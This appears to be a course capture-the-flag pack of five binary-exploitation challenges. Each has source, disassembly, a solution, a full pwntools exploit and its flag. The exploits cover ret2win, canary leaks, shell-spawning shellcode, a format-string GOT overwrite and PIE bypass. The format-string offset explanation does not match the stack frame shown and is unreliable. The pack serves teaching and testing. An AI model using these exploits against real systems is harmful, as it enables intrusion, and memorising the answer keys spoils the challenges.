@@ -1,0 +1,711 @@
+Challenge: Warmup Overflow
+Category: pwn
+Difficulty: easy
+Points: 100
+Flag: FLAG{ret2win_warmup}
+Flag format: FLAG{...}
+Hint: gets() never checks how much it reads. Count the bytes from your buffer to the saved return address.
+Hint: There is already a win() function in the binary. You just have to land on it. If puts() inside win() crashes, you skipped stack alignment.
+Description:
+A tiny service is listening. Connect with:
+
+  nc 6447.lol 1337
+
+Source (warmup.c, compiled: gcc -fno-stack-protector -no-pie -z noexecstack -O0 -o warmup warmup.c):
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+/* The flag, obfuscated in .rodata. win() de-obfuscates it at runtime. */
+static const unsigned char enc[] = {
+    0x55, 0x5f, 0x52, 0x54, 0x68, 0x61, 0x76, 0x67,
+    0x21, 0x64, 0x7a, 0x7d, 0x4c, 0x64, 0x72, 0x61,
+    0x7e, 0x66, 0x63, 0x6e, 0x00
+};
+
+void win(void) {
+    char out[64];
+    int i;
+    for (i = 0; enc[i]; i++)
+        out[i] = enc[i] ^ 0x13;
+    out[i] = 0;
+    puts(out);
+}
+
+void vuln(void) {
+    char buf[64];
+    puts("Can you smash the stack?");
+    printf("> ");
+    gets(buf);
+}
+
+int main(void) {
+    setvbuf(stdout, NULL, _IONBF, 0);
+    puts("=== COMP6447 :: Warmup Overflow ===");
+    vuln();
+    puts("Goodbye.");
+    return 0;
+}
+```
+
+checksec:
+
+```
+Arch:       amd64-64-little
+RELRO:      Partial RELRO
+Stack:      No canary found
+NX:         NX enabled
+PIE:        No PIE (0x400000)
+```
+
+Disassembly (objdump -d, relevant functions):
+
+```
+0000000000401176 <win>:
+  401176:  55                    push   rbp
+  401177:  48 89 e5              mov    rbp,rsp
+  40117a:  48 83 ec 50           sub    rsp,0x50
+  40117e:  c7 45 fc 00 00 00 00  mov    DWORD PTR [rbp-0x4],0x0
+  401185:  eb 1e                 jmp    4011a5 <win+0x2f>
+  401187:  8b 45 fc              mov    eax,DWORD PTR [rbp-0x4]
+  40118a:  48 98                 cdqe
+  40118c:  0f b6 80 40 40 40 00  movzx  eax,BYTE PTR [rax+0x404040]   ; enc[i]
+  401193:  83 f0 13              xor    eax,0x13                      ; ^ 0x13  (the key)
+  401196:  ...                   mov    BYTE PTR [rbp-0x50+i],al      ; out[i]
+  4011a5:  ...                   cmp    enc[i], 0  -> loop
+  4011b4:  48 8d 45 b0           lea    rax,[rbp-0x50]                ; &out
+  4011b8:  48 89 c7              mov    rdi,rax
+  4011bb:  e8 a0 fe ff ff        call   401060 <puts@plt>
+  4011c0:  90                    nop
+  4011c1:  c9                    leave
+  4011c2:  c3                    ret
+
+00000000004011c3 <vuln>:
+  4011c3:  55                    push   rbp
+  4011c4:  48 89 e5              mov    rbp,rsp
+  4011c7:  48 83 ec 40           sub    rsp,0x40                      ; 0x40-byte frame
+  4011cb:  48 8d 05 .. .. .. ..  lea    rax,[rip+...]  ; "Can you smash the stack?"
+  4011d2:  48 89 c7              mov    rdi,rax
+  4011d5:  e8 .. .. .. ..        call   401060 <puts@plt>
+  4011da:  bf 3e 00 00 00        ... printf("> ")
+  4011e9:  48 8d 45 c0           lea    rax,[rbp-0x40]                ; &buf
+  4011ed:  48 89 c7              mov    rdi,rax
+  4011f0:  b8 00 00 00 00        mov    eax,0x0
+  4011f5:  e8 .. .. .. ..        call   401070 <gets@plt>
+  4011fa:  90                    nop
+  4011fb:  c9                    leave
+  4011fc:  c3                    ret
+```
+
+A 16-byte-alignment ret gadget exists at 0x40101a:
+
+```
+000000000040101a:  c3                    ret
+```
+
+The program prints, in order, byte-for-byte (the "> " prompt has no trailing newline):
+
+```
+=== COMP6447 :: Warmup Overflow ===
+Can you smash the stack?
+>
+```
+
+Solution:
+From vuln() the buffer is at rbp-0x40, i.e. 64 bytes. The saved RBP sits at [rbp], and the saved return address at [rbp+8]. So the distance from the start of buf to the saved return address is 0x40 + 8 = 72 bytes.
+
+gets() reads an unbounded line into buf, so send 72 bytes of padding, then overwrite the saved return address with the address of win() (0x401176, fixed because the binary is No-PIE).
+
+One wrinkle: win() calls puts(), and glibc's puts uses SSE instructions (movaps) that fault if RSP is not 16-byte aligned. Right after a ret into win(), RSP is 8 off alignment. Fix it by first returning into a bare `ret` gadget (0x40101a), which realigns the stack, then into win().
+
+win() walks enc[] and XORs each byte with 0x13:
+0x55^0x13=F, 0x5f^0x13=L, 0x52^0x13=A, 0x54^0x13=G, 0x68^0x13={, 0x61^0x13=r, 0x76^0x13=e, 0x67^0x13=t, 0x21^0x13=2, 0x64^0x13=w, 0x7a^0x13=i, 0x7d^0x13=n, 0x4c^0x13=_, 0x64^0x13=w, 0x72^0x13=a, 0x61^0x13=r, 0x7e^0x13=m, 0x66^0x13=u, 0x63^0x13=p, 0x6e^0x13=} and it puts() the result.
+
+Full exploit:
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+
+context.arch = 'amd64'
+
+io = remote('6447.lol', 1337)
+
+win = 0x401176
+ret = 0x40101a          # alignment gadget
+
+payload  = b'A' * 64    # fill buf[64]
+payload += b'B' * 8     # overwrite saved rbp
+payload += p64(ret)     # 16-byte stack alignment
+payload += p64(win)     # overwrite saved return address -> win()
+
+io.recvuntil(b'> ')
+io.sendline(payload)
+print(io.recvline().decode())   # -> FLAG{ret2win_warmup}
+io.close()
+```
+
+Flag: FLAG{ret2win_warmup}
+
+
+Challenge: Canary Cafe
+Category: pwn
+Difficulty: medium
+Points: 200
+Flag: FLAG{sm4sh_th3_c4n4ry_first}
+Flag format: FLAG{...}
+Hint: You get to send input twice, and the first reply echoes your buffer. The stack canary's lowest byte is always 0x00 - what if you paint over it?
+Hint: Leak the 7 high bytes of the canary with the echo, prepend a 0x00, then replay that exact value in its slot during the second overflow.
+Description:
+A stack-protected service. Connect with:
+
+  nc 6447.lol 1338
+
+Source (canary.c, compiled: gcc -fstack-protector-all -no-pie -z noexecstack -O0 -o canary canary.c):
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+static const unsigned char enc[] = {
+    0x71, 0x7b, 0x76, 0x70, 0x4c, 0x44, 0x5a, 0x03,
+    0x44, 0x5f, 0x68, 0x43, 0x5f, 0x04, 0x68, 0x54,
+    0x03, 0x59, 0x03, 0x45, 0x4e, 0x68, 0x51, 0x5e,
+    0x45, 0x44, 0x43, 0x4a, 0x00
+};
+
+void win(void) {
+    char out[64]; int i;
+    for (i = 0; enc[i]; i++) out[i] = enc[i] ^ 0x37;
+    out[i] = 0;
+    puts(out);
+}
+
+void vuln(void) {
+    char buf[80];
+    puts("Leak me, then beat me.");
+    printf("> ");
+    read(0, buf, 81);                 /* one byte past buf: clobbers canary LSB */
+    printf("You said: %s\n", buf);    /* prints until a NUL -> leaks canary[1..7] */
+    printf("> ");
+    read(0, buf, 200);                /* full overflow */
+}
+
+int main(void) {
+    setvbuf(stdout, NULL, _IONBF, 0);
+    puts("=== COMP6447 :: Canary Cafe ===");
+    vuln();
+    puts("Bye.");
+    return 0;
+}
+```
+
+checksec:
+
+```
+Arch:       amd64-64-little
+RELRO:      Partial RELRO
+Stack:      Canary found
+NX:         NX enabled
+PIE:        No PIE (0x400000)
+```
+
+Disassembly (objdump -d, vuln() stack layout):
+
+```
+0000000000401205 <win>:            ; XORs enc[] with 0x37, then puts()
+  401205:  55                    push   rbp
+  ...
+  401290:  c3                    ret
+
+0000000000401291 <vuln>:
+  401291:  55                    push   rbp
+  401292:  48 89 e5              mov    rbp,rsp
+  401295:  48 83 ec 60           sub    rsp,0x60
+  401299:  64 48 8b 04 25 28 00  mov    rax,QWORD PTR fs:0x28         ; canary
+  4012a2:  48 89 45 f8           mov    QWORD PTR [rbp-0x8],rax        ; canary @ rbp-0x8
+  ...                            ; buf is at rbp-0x58
+  4012bb:  48 8d 45 a8           lea    rax,[rbp-0x58]                 ; &buf
+  4012bf:  ba 51 00 00 00        mov    edx,0x51                      ; read len = 81
+  4012c4:  48 89 c6              mov    rsi,rax
+  4012c7:  bf 00 00 00 00        mov    edi,0x0
+  4012cc:  e8 .. .. .. ..        call   401080 <read@plt>
+  ...                            ; printf("You said: %s\n", buf)
+  ...
+  4012f0:  48 8d 45 a8           lea    rax,[rbp-0x58]                 ; &buf again
+  4012f4:  ba c8 00 00 00        mov    edx,0xc8                      ; read len = 200
+  ...
+  401300:  e8 .. .. .. ..        call   401080 <read@plt>
+  ...                            ; canary check, then leave/ret
+```
+
+Alignment ret gadget at 0x40101a.
+
+buf is at rbp-0x58 and the canary at rbp-0x8, so buf is 0x58 - 0x08 = 0x50 = 80 bytes, exactly reaching the canary.
+
+The program prints, in order (both "> " prompts have no trailing newline):
+
+```
+=== COMP6447 :: Canary Cafe ===
+Leak me, then beat me.
+> You said: <your 81 bytes><7 canary bytes>
+>
+```
+
+Solution:
+Stack layout in vuln(): buf[80] at rbp-0x58, then the 8-byte canary at rbp-0x8, then saved RBP at [rbp], then the saved return address at [rbp+8].
+
+Step 1 - leak the canary. The first read() takes up to 81 bytes. Send exactly 81 "A"s: the first 80 fill buf, and the 81st overwrites the canary's least-significant byte (normally 0x00) with 0x41. printf("%s", buf) then prints from buf until it hits a NUL - so it prints your 81 bytes and then keeps going straight into canary bytes 1..7 (which are random but non-terminating). Recover the full canary as u64(b"\x00" + those_7_bytes), restoring the real 0x00 LSB.
+
+Step 2 - overflow with the canary intact. The second read() takes 200 bytes. Lay down 80 bytes of padding, the recovered canary in its slot, 8 bytes for saved RBP, a ret gadget for alignment, then win().
+
+win() XORs enc[] with 0x37, giving FLAG{sm4sh_th3_c4n4ry_first}, and puts() it.
+
+Full exploit:
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+
+context.arch = 'amd64'
+
+io = remote('6447.lol', 1338)
+
+win = 0x401205
+ret = 0x40101a
+
+# --- Step 1: leak the canary ---
+io.recvuntil(b'> ')
+io.send(b'A' * 81)                 # 80 fill + 1 byte paints over canary LSB
+io.recvuntil(b'A' * 81)            # consume the echo of our input
+leak = io.recv(7)                  # canary bytes 1..7
+canary = u64(b'\x00' + leak)       # restore the 0x00 LSB
+log.info('canary = %#018x', canary)
+
+# --- Step 2: overflow, canary preserved ---
+payload  = b'A' * 80
+payload += p64(canary)
+payload += b'B' * 8                # saved rbp
+payload += p64(ret)                # alignment
+payload += p64(win)
+
+io.recvuntil(b'> ')
+io.send(payload)
+print(io.recvline().decode())      # -> FLAG{sm4sh_th3_c4n4ry_first}
+io.close()
+```
+
+Flag: FLAG{sm4sh_th3_c4n4ry_first}
+
+
+Challenge: BYO Shellcode
+Category: pwn
+Difficulty: medium
+Points: 300
+Flag: FLAG{shellc0de_on_an_exec_st4ck}
+Flag format: FLAG{...}
+Hint: There is no win() this time. checksec the stack - what does "NX disabled" let you do with the bytes you send?
+Hint: The program hands you the buffer's runtime address. Put execve("/bin/sh") shellcode at the start of the buffer and return straight to it.
+Description:
+No helper function in this one - you bring your own code. Connect with:
+
+  nc 6447.lol 1339
+
+The flag lives in ./flag.txt next to the binary on the server. For reference, running `base64 flag.txt` on the server prints:
+
+```
+RkxBR3tzaGVsbGMwZGVfb25fYW5fZXhlY19zdDRja30K
+```
+
+Source (shellcode.c, compiled: gcc -fno-stack-protector -no-pie -z execstack -O0 -o shellcode shellcode.c):
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void vuln(void) {
+    char buf[144];
+    printf("buf is at %p\n", buf);    /* the gift: a stack address leak */
+    printf("> ");
+    read(0, buf, 512);                /* overflow; the stack is executable */
+}
+
+int main(void) {
+    setvbuf(stdout, NULL, _IONBF, 0);
+    puts("=== COMP6447 :: BYO Shellcode ===");
+    puts("No win() this time. The flag is in ./flag.txt on the server.");
+    vuln();
+    return 0;
+}
+```
+
+checksec:
+
+```
+Arch:       amd64-64-little
+RELRO:      Partial RELRO
+Stack:      No canary found
+NX:         NX disabled            <-- executable stack
+PIE:        No PIE (0x400000)
+```
+
+Disassembly (objdump -d, vuln()):
+
+```
+0000000000401182 <vuln>:
+  401182:  55                    push   rbp
+  401183:  48 89 e5              mov    rbp,rsp
+  401186:  48 83 ec 90           sub    rsp,0x90                      ; 0x90-byte frame
+  40118d:  48 8d 85 70 ff ff ff  lea    rax,[rbp-0x90]                ; &buf
+  401194:  48 89 c6              mov    rsi,rax
+  401197:  48 8d 05 .. .. .. ..  lea    rax,[rip+...]  ; "buf is at %p\n"
+  40119e:  48 89 c7              mov    rdi,rax
+  4011a1:  b8 00 00 00 00        mov    eax,0x0
+  4011a6:  e8 .. .. .. ..        call   401070 <printf@plt>
+  ...                            ; printf("> ")
+  4011c0:  48 8d 85 70 ff ff ff  lea    rax,[rbp-0x90]                ; &buf
+  4011c7:  ba 00 02 00 00        mov    edx,0x200                     ; read len = 512
+  4011cc:  48 89 c6              mov    rsi,rax
+  4011cf:  bf 00 00 00 00        mov    edi,0x0
+  4011d4:  e8 .. .. .. ..        call   401080 <read@plt>
+  4011d9:  90                    nop
+  4011da:  c9                    leave
+  4011db:  c3                    ret
+```
+
+buf is at rbp-0x90 (144 bytes). The program prints, in order ("> " has no trailing newline; the address varies per run because of ASLR, which is exactly why it is leaked):
+
+```
+=== COMP6447 :: BYO Shellcode ===
+No win() this time. The flag is in ./flag.txt on the server.
+buf is at 0x7ffce1a2b3c0
+>
+```
+
+Solution:
+buf is at rbp-0x90, so the distance from the start of buf to the saved return address is 0x90 + 8 = 152 bytes.
+
+The stack is executable (NX disabled), and the program leaks buf's runtime address, so the plan is: place null-free execve("/bin/sh") shellcode at the very start of buf, pad up to 152 bytes, then overwrite the saved return address with the leaked buf address. When vuln() returns, execution jumps to the top of buf and runs the shellcode, giving a shell. A NOP sled between the shellcode and the return address keeps the math forgiving. Once you have the shell, read the flag file.
+
+`base64 flag.txt` was given as RkxBR3tzaGVsbGMwZGVfb25fYW5fZXhlY19zdDRja30K, which base64-decodes to FLAG{shellc0de_on_an_exec_st4ck} - the same bytes `cat flag.txt` returns over the shell.
+
+Full exploit:
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+
+context.arch = 'amd64'
+
+io = remote('6447.lol', 1339)
+
+io.recvuntil(b'buf is at ')
+buf = int(io.recvline().strip(), 16)
+log.info('buf = %#x', buf)
+
+sc = asm(shellcraft.amd64.linux.sh())   # null-free execve("/bin/sh")
+offset = 152                             # 144 (buf) + 8 (saved rbp)
+payload = sc.ljust(offset, b'\x90') + p64(buf)   # shellcode + NOP pad + ret -> buf
+
+io.recvuntil(b'> ')
+io.send(payload)
+
+io.sendline(b'cat flag.txt')
+print(io.recvline_contains(b'FLAG').decode())   # -> FLAG{shellc0de_on_an_exec_st4ck}
+io.close()
+```
+
+Flag: FLAG{shellc0de_on_an_exec_st4ck}
+
+
+Challenge: Say My Name
+Category: pwn
+Difficulty: hard
+Points: 300
+Flag: FLAG{f0rmat_str1ngs_wr1te_anywh3re}
+Flag format: FLAG{...}
+Hint: printf(buf) with no format string of its own is a read AND write primitive. First find which %N$ index lines up with your own input.
+Hint: Partial RELRO leaves the GOT writable. exit() is called right after the bug - overwrite exit@GOT with win() using %hhn (pwntools fmtstr_payload does the byte-by-byte arithmetic).
+Description:
+This service prints your name back to you. Connect with:
+
+  nc 6447.lol 1340
+
+Source (fmt.c, compiled: gcc -fno-stack-protector -no-pie -O0 -o fmt fmt.c):
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+static const unsigned char enc[] = {
+    0x1c, 0x16, 0x1b, 0x1d, 0x21, 0x3c, 0x6a, 0x28,
+    0x37, 0x3b, 0x2e, 0x05, 0x29, 0x2e, 0x28, 0x6b,
+    0x34, 0x3d, 0x29, 0x05, 0x2d, 0x28, 0x6b, 0x2e,
+    0x3f, 0x05, 0x3b, 0x34, 0x23, 0x2d, 0x32, 0x69,
+    0x28, 0x3f, 0x27, 0x00
+};
+
+void win(void) {
+    char out[64]; int i;
+    for (i = 0; enc[i]; i++) out[i] = enc[i] ^ 0x5a;
+    out[i] = 0;
+    puts(out);
+}
+
+int main(void) {
+    char buf[128];
+    setvbuf(stdout, NULL, _IONBF, 0);
+    puts("=== COMP6447 :: Say My Name ===");
+    printf("> ");
+    fgets(buf, sizeof(buf), stdin);
+    printf(buf);          /* format string bug: buf is the format string */
+    exit(0);              /* exit@GOT is dereferenced here */
+}
+```
+
+checksec:
+
+```
+Arch:       amd64-64-little
+RELRO:      Partial RELRO           <-- GOT is writable
+Stack:      No canary found
+NX:         NX enabled
+PIE:        No PIE (0x400000)
+```
+
+Disassembly (objdump -d, main() and the GOT):
+
+```
+0000000000401196 <win>:            ; XORs enc[] with 0x5a, then puts()
+  401196:  55                    push   rbp
+  ...
+  401230:  c3                    ret
+
+0000000000401231 <main>:
+  401231:  55                    push   rbp
+  401232:  48 89 e5              mov    rbp,rsp
+  401235:  48 83 ec 80           sub    rsp,0x80                      ; buf[128] at rbp-0x80
+  ...                            ; puts("=== ... ==="); printf("> ")
+  401270:  48 8d 45 80           lea    rax,[rbp-0x80]                ; &buf
+  ...                            ; fgets(buf, 128, stdin)
+  401290:  48 8d 45 80           lea    rax,[rbp-0x80]                ; &buf
+  401294:  48 89 c7              mov    rdi,rax                        ; fmt = buf
+  401297:  b8 00 00 00 00        mov    eax,0x0
+  40129c:  e8 .. .. .. ..        call   401060 <printf@plt>           ; printf(buf)
+  4012a1:  bf 00 00 00 00        mov    edi,0x0
+  4012a6:  e8 .. .. .. ..        call   401080 <exit@plt>             ; exit(0)
+
+GOT (.got.plt):
+  0x404030  puts@GOT
+  0x404038  printf@GOT
+  0x404040  fgets@GOT
+  0x404048  exit@GOT            <-- overwrite target
+```
+
+The program prints exactly ("> " has no trailing newline):
+
+```
+=== COMP6447 :: Say My Name ===
+>
+```
+
+Solution:
+printf(buf) formats attacker-controlled bytes, which is both a leak and an arbitrary write. The order of work:
+
+1. Find the argument index of your own input. Send AAAAAAAA%6$p%7$p%8$p and watch where 0x4141414141414141 shows up. On this binary the 8 bytes you sent appear at index 8 (the first six %N$ slots map to the register args rsi..r9 and two stack slots; your fgets buffer lands at %8$). So the format-string offset is 8.
+
+2. Build the write. Partial RELRO keeps the GOT writable, and main() calls exit(0) immediately after the buggy printf. So overwrite exit@GOT (0x404048) with the address of win() (0x401196). The write is done with %hhn one byte at a time, ordering the four low bytes by value so the running %c count only increases - this is exactly what pwntools fmtstr_payload(offset, {addr: value}) generates.
+
+3. When printf finishes, it has rewritten exit@GOT, so the following exit(0) jumps into win(). win() XORs enc[] with 0x5a and puts() the result:
+0x1c^0x5a=F, 0x16^0x5a=L, 0x1b^0x5a=A, 0x1d^0x5a=G, 0x21^0x5a={, ... , 0x27^0x5a=} => FLAG{f0rmat_str1ngs_wr1te_anywh3re}.
+
+Full exploit:
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+
+context.arch = 'amd64'
+
+exit_got = 0x404048
+win      = 0x401196
+
+io = remote('6447.lol', 1340)
+io.recvuntil(b'> ')
+
+# Offset 8 was found with:  AAAAAAAA%6$p%7$p%8$p  -> our 'AAAAAAAA' prints at %8$
+payload = fmtstr_payload(8, {exit_got: win})   # %hhn GOT overwrite, exit@GOT -> win()
+io.sendline(payload)
+
+# printf() performs the write, then exit(0) dispatches through exit@GOT into win()
+print(io.recvline_contains(b'FLAG').decode())  # -> FLAG{f0rmat_str1ngs_wr1te_anywh3re}
+io.close()
+```
+
+Flag: FLAG{f0rmat_str1ngs_wr1te_anywh3re}
+
+
+Challenge: Pie in the Sky
+Category: pwn
+Difficulty: insane
+Points: 500
+Flag: FLAG{pie_is_1_leak_plus_1_0ffset}
+Flag format: FLAG{...}
+Hint: Every address moves at runtime, but the distances between functions inside the binary never change. The banner hands you one real address.
+Hint: Two leaks are needed: the PIE base (from the printed vuln() address minus its static offset) and the canary (same echo trick as before). Then it is just ret2win.
+Description:
+Full protections, two leaks, one shot. Connect with:
+
+  nc 6447.lol 1341
+
+Source (pie.c, compiled: gcc -fstack-protector-all -fpie -pie -z noexecstack -O0 -o pie pie.c):
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+static const unsigned char enc[] = {
+    0x2d, 0x27, 0x2a, 0x2c, 0x10, 0x1b, 0x02, 0x0e,
+    0x34, 0x02, 0x18, 0x34, 0x5a, 0x34, 0x07, 0x0e,
+    0x0a, 0x00, 0x34, 0x1b, 0x07, 0x1e, 0x18, 0x34,
+    0x5a, 0x34, 0x5b, 0x0d, 0x0d, 0x18, 0x0e, 0x1f,
+    0x16, 0x00
+};
+
+void win(void) {
+    char out[64]; int i;
+    for (i = 0; enc[i]; i++) out[i] = enc[i] ^ 0x6b;
+    out[i] = 0;
+    puts(out);
+}
+
+void vuln(void) {
+    char buf[64];
+    printf("vuln() lives at %p\n", vuln);   /* PIE leak */
+    puts("Say something:");
+    printf("> ");
+    read(0, buf, 73);                        /* clobbers canary LSB */
+    printf("echo: %s\n", buf);               /* leaks canary[1..7] */
+    printf("> ");
+    read(0, buf, 200);                       /* overflow */
+}
+
+int main(void) {
+    setvbuf(stdout, NULL, _IONBF, 0);
+    puts("=== COMP6447 :: Pie in the Sky ===");
+    vuln();
+    puts("Bye.");
+    return 0;
+}
+```
+
+checksec:
+
+```
+Arch:       amd64-64-little
+RELRO:      Full RELRO
+Stack:      Canary found
+NX:         NX enabled
+PIE:        PIE enabled
+```
+
+Disassembly (objdump -d, file offsets - add the PIE base at runtime):
+
+```
+0000000000001189 <win>:            ; XORs enc[] with 0x6b, then puts()
+    1189:  55                    push   rbp
+    ...
+    1234:  c3                    ret
+
+00000000000011d5 <vuln>:
+    11d5:  55                    push   rbp
+    11d6:  48 89 e5              mov    rbp,rsp
+    11d9:  48 83 ec 50           sub    rsp,0x50
+    11dd:  64 48 8b 04 25 28 00  mov    rax,QWORD PTR fs:0x28         ; canary
+    11e6:  48 89 45 f8           mov    QWORD PTR [rbp-0x8],rax        ; canary @ rbp-0x8
+    ...                          ; printf("vuln() lives at %p\n", vuln)
+    1210:  48 8d 45 b0           lea    rax,[rbp-0x50]                 ; &buf  (buf 0x48 below canary)
+    1214:  ba 49 00 00 00        mov    edx,0x49                      ; read len = 73
+    ...
+    1221:  e8 .. .. .. ..        call   <read@plt>
+    ...                          ; printf("echo: %s\n", buf)
+    1250:  48 8d 45 b0           lea    rax,[rbp-0x50]                 ; &buf again
+    1254:  ba c8 00 00 00        mov    edx,0xc8                      ; read len = 200
+    ...
+    1261:  e8 .. .. .. ..        call   <read@plt>
+    ...                          ; canary check, leave, ret
+
+Static offsets (constant across runs):
+  vuln  = base + 0x11d5
+  win   = base + 0x1189       (win - vuln = -0x4c)
+  ret   = base + 0x101a       (a bare `ret`, for 16-byte alignment)
+```
+
+buf is at rbp-0x50 and the canary at rbp-0x8, so buf is 0x50 - 0x08 = 0x48 = 72 bytes, exactly reaching the canary.
+
+The program prints, in order (both "> " prompts have no trailing newline; the address varies per run):
+
+```
+=== COMP6447 :: Pie in the Sky ===
+vuln() lives at 0x55e3a8c491d5
+Say something:
+> echo: <your 73 bytes><7 canary bytes>
+>
+```
+
+Solution:
+PIE randomises the load address, but the byte distances between functions in the image are fixed. The banner leaks the runtime address of vuln(), so:
+
+base = leaked_vuln - 0x11d5
+win  = base + 0x1189
+ret  = base + 0x101a
+
+Next, defeat the canary the same way as Canary Cafe. buf[64] sits at rbp-0x50 and the canary at rbp-0x8, i.e. 0x48 = 72 bytes above buf (note buf is declared [64] but there are 8 bytes of frame padding, so the real distance to the canary is 72 - this is why you read the disassembly rather than trusting the array size). The first read() takes 73 bytes: 72 to fill up to the canary and 1 more to paint over its 0x00 LSB, so printf("%s") leaks canary bytes 1..7. Rebuild it as u64(b"\x00" + leak).
+
+Finally overflow: 72 bytes of padding, the recovered canary, 8 bytes for saved RBP, the alignment ret gadget, then win(). win() XORs enc[] with 0x6b to produce FLAG{pie_is_1_leak_plus_1_0ffset} and puts() it.
+
+Full exploit:
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+
+context.arch = 'amd64'
+
+io = remote('6447.lol', 1341)
+
+# --- leak 1: PIE base ---
+io.recvuntil(b'vuln() lives at ')
+vuln_rt = int(io.recvline().strip(), 16)
+base = vuln_rt - 0x11d5
+win  = base + 0x1189
+ret  = base + 0x101a
+log.info('PIE base = %#x', base)
+
+# --- leak 2: stack canary ---
+io.recvuntil(b'> ')
+io.send(b'A' * 73)                 # 72 fill + 1 byte over canary LSB
+io.recvuntil(b'A' * 73)
+canary = u64(b'\x00' + io.recv(7))
+log.info('canary = %#018x', canary)
+
+# --- overflow: ret2win ---
+payload  = b'A' * 72
+payload += p64(canary)
+payload += b'B' * 8                # saved rbp
+payload += p64(ret)                # alignment
+payload += p64(win)
+
+io.recvuntil(b'> ')
+io.send(payload)
+print(io.recvline_contains(b'FLAG').decode())   # -> FLAG{pie_is_1_leak_plus_1_0ffset}
+io.close()
+```
+
+Flag: FLAG{pie_is_1_leak_plus_1_0ffset}
